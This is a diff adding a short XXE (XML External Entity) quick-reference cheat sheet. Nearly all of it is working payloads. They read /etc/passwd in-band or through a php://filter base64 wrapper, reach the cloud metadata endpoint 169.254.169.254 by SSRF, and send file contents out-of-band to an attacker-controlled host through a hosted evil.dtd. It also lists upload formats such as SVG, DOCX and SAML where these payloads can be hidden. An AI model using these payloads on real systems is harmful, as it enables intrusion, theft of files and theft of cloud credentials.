@@ -1,0 +1,11 @@
+XXE — QUICK REF
+
+In-band file read:
+  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>
+  base64 (breaks XML): <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+SSRF/metadata:  <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
+Blind OOB (host evil.dtd):
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<you>/?d=%file;'>"> %eval; %exfil;
+  trigger: <!DOCTYPE r [<!ENTITY % r SYSTEM "http://<you>/evil.dtd"> %r;]>
+Hides in: XML POST, SOAP, SAML, SVG/DOCX/XLSX uploads
